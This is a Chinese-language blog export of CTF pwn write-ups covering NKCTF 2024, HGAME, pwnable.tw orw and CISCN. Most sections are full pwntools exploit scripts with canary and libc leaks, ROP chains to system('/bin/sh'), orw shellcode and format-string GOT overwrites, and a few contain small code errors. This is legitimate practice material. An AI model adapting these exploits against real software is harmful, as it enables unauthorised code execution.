class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(log_level="debug",arch="amd64")</span><br><span class="line">#p = remote("node5.anna.nssctf.cn",28645)</span><br><span class="line">p = process("./pwn")</span><br><span class="line">elf = ELF("./pwn")</span><br><span class="line">libc = ELF('./libc.so.6')</span><br><span class="line"></span><br><span class="line">p.recvuntil("Select a option:")</span><br><span class="line">p.sendline(b'1')</span><br><span class="line">for i in range(0,50):</span><br><span class="line">p.sendline(b'15.0 SS')</span><br><span class="line"></span><br><span class="line">p.recvuntil("Select a option:")</span><br><span class="line">p.sendline(b'2')</span><br><span class="line"></span><br><span class="line">p.sendlineafter("Input your nickname.\n",b'%7$p')</span><br><span class="line"></span><br><span class="line">p.recvuntil(b'0x')</span><br><span class="line">canary = int(p.recv(16), 16)</span><br><span class="line">log.info('canary'+':'+hex(canary))</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line">p.sendafter(b"Can you teach me how to play maimai?\n",b'1')</span><br><span class="line">p.sendlineafter(b'option:', b'2')</span><br><span class="line">p.sendafter(b'nickname.\n', "%13$p")</span><br><span class="line"></span><br><span class="line">p.recvuntil(b'0x')</span><br><span class="line">libc.address = int(p.recv(12), 16) - 0x29d90</span><br><span class="line">log.info('libc.address'+':'+hex(libc.address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + 0x2a3e5</span><br><span class="line">ret = libc.address + 0x29139</span><br><span class="line">system = libc.sym['system']</span><br><span class="line">binsh = next(libc.search(b'/bin/sh'))</span><br><span class="line">setuid = libc.sym['setuid']</span><br><span class="line"></span><br><span class="line">payload = b'a' * (0x28) + p64(canary) + b'a' * 8 + p64(pop_rdi) + p64(0) + p64(setuid) + p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.sendafter(b'maimai?', payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/02/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNKCTF%202024%5Dmaimai.1.png"></p><h2 id="NKCTF-2024-leek"><a href="#NKCTF-2024-leek" class="headerlink" title="[NKCTF 2024] leek"></a>[NKCTF 2024] leek</h2><p>pwn和密码的结合(这次比赛好多结合体，要拓宽方向了)</p><p>中国剩余定理</p><p>题目一开始允许输入6字节,并将这6个数字作为模返stdout的余数,并同时返回一个栈指针的尾地址</p><p>通过适当输入6个素数和返回的地址可以得到libc地址(通过CRT),得到的值比真实libc要小需要加模爆破64位系统，libc的加载地址首字节0x7f(大多数情况下)，尾部12位固定不变，所以可以通过首字节确定爆破的结果是否正确,当首字节为0x7f尾12位相同时可以确定libc地址和版本。</p><p>之后通过一字节的溢出，把libc地址放在指针后面</p><p>memcpy时将payload复制到返回地址位置来实现ROP</p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from sympy.ntheory.modular import crt</span><br><span class="line"></span><br><span class="line">context(arch='amd64', log_level='debug')</span><br><span class="line">libc = ELF('./libc.so.6')</span><br><span class="line"></span><br><span class="line">p = process('./leak')</span><br><span class="line"></span><br><span class="line">#gdb.attach(p, "b*0x555555555296\nc")</span><br><span class="line"></span><br><span class="line">ps = [101,103,107,109,113,127]</span><br><span class="line">cs = [0]*6</span><br><span class="line"></span><br><span class="line">p.sendafter(b'\n',bytes(ps))</span><br><span class="line">for i inrange(6):</span><br><span class="line">    cs[i] = p.recv(1)[0]</span><br><span class="line"></span><br><span class="line">stack = p.recv(1)[0]</span><br><span class="line">stdout,pd = crt(ps,cs)</span><br><span class="line">stdout,pd = int(stdout),int(pd)</span><br><span class="line"></span><br><span class="line">print(hex(stdout), hex(pd))</span><br><span class="line"></span><br><span class="line">while stdout&amp;0xfff != 0x760:</span><br><span class="line">    stdout+=pd </span><br><span class="line"></span><br><span class="line">libc.address = stdout - libc.sym['_IO_2_1_stdout_']</span><br><span class="line"></span><br><span class="line">print(f'{libc.address = :x}')</span><br><span class="line">print(stdout)</span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + 0x27725 #0x2a3e5</span><br><span class="line">bin_sh = next(libc.search(b'/bin/sh\0'))</span><br><span class="line">system = libc.sym['system']</span><br><span class="line"></span><br><span class="line">print(f"{pop_rdi:x}{bin_sh:x}{system:x}")</span><br><span class="line">print(pop_rdi,bin_sh,system)</span><br><span class="line"></span><br><span class="line">pay = flat(pop_rdi+1, pop_rdi, bin_sh, system) + p8((stack+0x58)&amp;0xff)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">print(stdout)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>orw笔记(持续更新)</title>
      <link href="/2024/02/21/orw/"/>
      <url>/2024/02/21/orw/</url>
      
        <content type="html"><![CDATA[<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>orw禁用了系统调用，采用了沙箱技术开启了沙箱保护，我们不能正常的get shell，只能用ROP链来调用其他的函数，这时候需要通过调用open、read、write这样的函数打开flag</p><h2 id="沙箱函数"><a href="#沙箱函数" class="headerlink" title="沙箱函数"></a>沙箱函数</h2><p>原始的沙箱都是使用prctl()函数进行,所以能看见这个函数的时候一般都有开了沙箱</p><p><code>**prctl** ( int **option**,unsigned long arg2,unsigned long arg3,unsigned long arg4,unsigned long arg5 )</code></p><h2 id="查看沙箱"><a href="#查看沙箱" class="headerlink" title="查看沙箱"></a>查看沙箱</h2><p>可以通过<code>seccomp-tools</code>来判断是否添加沙箱，以及查看沙箱的规则</p><h3 id="seccomp-tools的安装"><a href="#seccomp-tools的安装" class="headerlink" title="seccomp-tools的安装"></a>seccomp-tools的安装</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install gcc ruby-dev</span><br><span class="line">$ gem install seccomp-tools</span><br></pre></td></tr></tbody></table></figure><h2 id="seccomp-tools的使用"><a href="#seccomp-tools的使用" class="headerlink" title="seccomp-tools的使用"></a>seccomp-tools的使用</h2><p><code>seccomp-tools dump ./pwn</code></p><h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap()"></a>mmap()</h2><p>一般来说，orw这种类型的题都会有一个mmap函数来改写一个地址的读写权限，我们需要利用这块地址来构造ROP链。</p><p><code>void *mmap (void *addr, size_t length, int prot, int flags, int fd, off_t offset);</code></p><h2 id="shellcode绕过"><a href="#shellcode绕过" class="headerlink" title="shellcode绕过"></a>shellcode绕过</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>没有开启NX保护的时候，可以让程序执行自己输入的指令直接调用orw三个系统调用(x86下的shellcode,x64需要修改一下寄存器)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#fd = open('/home/orw/flag',0) </span><br><span class="line">s = ''' xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; '''</span><br><span class="line"></span><br><span class="line">#read(fd,0x804a094,0x20) </span><br><span class="line">s = ''' mov edx,0x40; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; '''</span><br><span class="line"></span><br><span class="line">#write(1,0x804a094,0x20) </span><br><span class="line">s = ''' mov edx,0x40; mov ebx,1; mov eax,4 int 0x80; '''</span><br></pre></td></tr></tbody></table></figure><h2 id="ROP绕过"><a href="#ROP绕过" class="headerlink" title="ROP绕过"></a>ROP绕过</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>开启NX保护的题目，无法执行shellcode，需要通过ROP来调用orw的三个函数</p><h3 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw orw"></a>pwnable.tw orw</h3><p>先checksec一下</p><p><img src="/2024/02/21/orw/pwnable.tw.orw.1.png"></p><p>看一下函数逻辑</p><p><img src="/2024/02/21/orw/pwnable.tw.orw.2.png"></p><p><img src="/2024/02/21/orw/pwnable.tw.orw.3.png"></p><p>先是orw_seccomp限定了orw，然后hint用shellcode过去</p><p>那么写exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os="linux", arch="i386", log_level="debug")</span><br><span class="line"></span><br><span class="line">bss = 0x0804A040</span><br><span class="line"></span><br><span class="line">#p = process('./orw')</span><br><span class="line">p = remote('chall.pwnable.tw',10001)</span><br><span class="line">p.recvuntil('shellcode:')</span><br><span class="line"></span><br><span class="line">#open</span><br><span class="line">shellcode = asm("xor ebx,ebx;xor ecx,ecx;xor edx,edx;xor eax,eax;push ebx ;push 0x67616c66 ;push 0x2f77726f ;push 0x2f656d6f ;push 0x682f2f2f ;mov ebx,esp;mov al,0x5;int 0x80;")</span><br><span class="line"></span><br><span class="line">#read</span><br><span class="line">shellcode += asm("mov ebx,0x3;mov ecx,esp ;mov edx,0x40;xor eax,eax;mov al,0x3;int 0x80;")</span><br><span class="line"></span><br><span class="line">#write</span><br><span class="line">shellcode += asm("mov ebx,0x1;xor eax,eax ;mov al,0x4;int 0x80;")</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/02/21/orw/pwnable.tw.orw.4.png"></p><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><h3 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h3><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="/2024/02/21/orw/SROP%E4%BF%A1%E5%8F%B7.png"></p><p>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</p><p>内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。</p><p>需要注意的是，这一部分是在用户进程的地址空间的。</p><p>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</p><p>我的理解是，触发信号之后会进入内核然后寄存器压栈，然后准备sigreturn的调用。</p><p><img src="/2024/02/21/orw/SROP%E6%A0%88%E7%BB%93%E6%9E%84.png"></p><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>如果我们伪造栈上的进程上下文再直接调用sigreturn系统调用，就能通过伪造的进程上下文中的各种寄存器随意设置寄存器、跳转任意地址</p><h2 id="利用set-context"><a href="#利用set-context" class="headerlink" title="利用set_context"></a>利用set_context</h2><p>(下面还没学，学完之后更新)</p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>禁用free_hook则打malloc_hook</p><h2 id="House-of-KIWI"><a href="#House-of-KIWI" class="headerlink" title="House of KIWI"></a>House of KIWI</h2><p>参考博客：<a href="https://www.cnblogs.com/fuxuqiannian/p/17144953.html">https://www.cnblogs.com/fuxuqiannian/p/17144953.html</a></p><p><a href="https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/">https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_2">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_2</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2024.2.9</title>
      <link href="/2024/02/21/2024-2-9/"/>
      <url>/2024/02/21/2024-2-9/</url>
      
        <content type="html"><![CDATA[<h1 id="ff"><a href="#ff" class="headerlink" title="ff"></a>ff</h1><p>开了pie和canary的一道题，还有格式化字符串漏洞，用格式化字符串找到canary，然后利用当前程序的地址算出基址破解pie</p><p>先计算字符串的偏移，一般canary的后两位是00，算出canary的偏移在17,下一个程序在后两个，第19</p><p><img src="/2024/02/21/2024-2-9/ff.1.png"></p><p>因为要计算基址，先找到第19位程序的后四位地址再计算</p><p><img src="/2024/02/21/2024-2-9/ff.2.png"></p><p>然后找到后门函数位置</p><p><img src="/2024/02/21/2024-2-9/ff.3.png"></p><p>找到canary的偏移</p><p><img src="/2024/02/21/2024-2-9/ff.4.png"></p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os="linux", arch="amd64", log_level="debug")</span><br><span class="line"></span><br><span class="line">p = process("./ff")</span><br><span class="line"></span><br><span class="line">p.sendline(b"%17$p-%19$p")</span><br><span class="line"></span><br><span class="line">p.recvuntil("0x")</span><br><span class="line"></span><br><span class="line">canary = int(p.recv(16),16)</span><br><span class="line"></span><br><span class="line">ret = int(p.recv(15)[3:],16)</span><br><span class="line"></span><br><span class="line">base = ret - 0x146F</span><br><span class="line"></span><br><span class="line">cat = base + 0x1231</span><br><span class="line"></span><br><span class="line">payload = b'a' * 56 + p64(canary) + p64(0) + p64(cat)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/02/21/2024-2-9/ff.5.png"></p><p>(因为没自己写flag所以cat不到)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Week 2</title>
      <link href="/2024/02/06/week%202/"/>
      <url>/2024/02/06/week%202/</url>
      
        <content type="html"><![CDATA[<h1 id="HGAME-PWN"><a href="#HGAME-PWN" class="headerlink" title="HGAME PWN"></a>HGAME PWN</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>存在整数溢出，unsigned v4,输入-1，然后给一个shellcode</p><p>找一个shellcode放里面</p><p>shellcode来源：<a href="https://blog.csdn.net/mcmuyanga/article/details/114828207">https://blog.csdn.net/mcmuyanga/article/details/114828207</a></p><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">context(log_level='debug',arch='amd64',os='linux')</span><br><span class="line">p=process('./ezshellcode')</span><br><span class="line"></span><br><span class="line">p.sendlineafter("of your shellcode:",b'-1')</span><br><span class="line"></span><br><span class="line">shellcode=b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H</span><br><span class="line">0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1</span><br><span class="line">n0J0h0a070t"</span><br><span class="line"></span><br><span class="line">p.sendafter("input your shellcode:",shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="Elden-Random-Challenge"><a href="#Elden-Random-Challenge" class="headerlink" title="Elden Random Challenge"></a>Elden Random Challenge</h2><p>猜中99个随机数之后有个read的栈溢出，然后就是基础的ret2libc</p><p>使用ctypes调用链接库的函数，通过创建cdll.LoadLibary来找出随机数</p><p>进入myread函数之后通过read函数与动态链接库，写一个ret2libc</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])</span><br><span class="line"></span><br><span class="line">p = remote('106.14.57.14',30931)</span><br><span class="line"></span><br><span class="line">elf = ELF('./vuln')</span><br><span class="line">libc = cdll.LoadLibrary('./libc.so.6')</span><br><span class="line"></span><br><span class="line">libc.srand(0)  #找种子</span><br><span class="line"></span><br><span class="line">p.sendafter("thy name", b'a' * 0x12)</span><br><span class="line"></span><br><span class="line">for i in range(0,99):</span><br><span class="line">    m = libc.rand()%100+1</span><br><span class="line">    # print(m)</span><br><span class="line">    p.sendafter("guess the number:",p64(m)) </span><br><span class="line">    </span><br><span class="line">libc = ELF('./libc.so.6')</span><br><span class="line">puts_got = elf.got['puts']</span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x401423</span><br><span class="line">ret = 0x40101A</span><br><span class="line"></span><br><span class="line">read = 0x401250 </span><br><span class="line"></span><br><span class="line">payload=b'a'*0x38</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(read)</span><br><span class="line"></span><br><span class="line">p.sendafter("thy brilliant mind.",payload)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))-libc.sym['puts']</span><br><span class="line">                 </span><br><span class="line"># print("libc_base=",hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload=b'a'*0x38</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(libc_base+next(libc.search(b'/bin/sh')))</span><br><span class="line">payload+=p64(libc_base+libc.sym['system'])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="CISCN-2019西南-PWN1"><a href="#CISCN-2019西南-PWN1" class="headerlink" title="[CISCN 2019西南]PWN1"></a>[CISCN 2019西南]PWN1</h1><p>hgame的fmt没打通，就又找了一道格式化字符串的题</p><p>先gdb动调计算出偏移量4，找libc中的printf的got表，system的plt，加上个主函数</p><p>修改fini，重新走一遍程序，使用fmtstr把system换上去</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level='debug',arch='i386', os='linux')</span><br><span class="line"></span><br><span class="line">p = process('./pwn')</span><br><span class="line">elf = ELF(pwn)</span><br><span class="line">#rop = ROP(pwn)</span><br><span class="line"></span><br><span class="line">libc =elf.libc</span><br><span class="line"></span><br><span class="line">io.recvuntil(b"your name?\n")</span><br><span class="line"></span><br><span class="line">fini = 0x0804979C  </span><br><span class="line">system_addr = elf.plt['system']</span><br><span class="line">printf_addr = elf.got['printf']</span><br><span class="line">main = elf.symbols['main']</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(4, {fini :main , printf_addr:system_addr},write_size='short')#write_size有int short 跟byte</span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b"What's your name?\n")</span><br><span class="line"></span><br><span class="line">io.sendline(b'/bin/sh\x00')</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
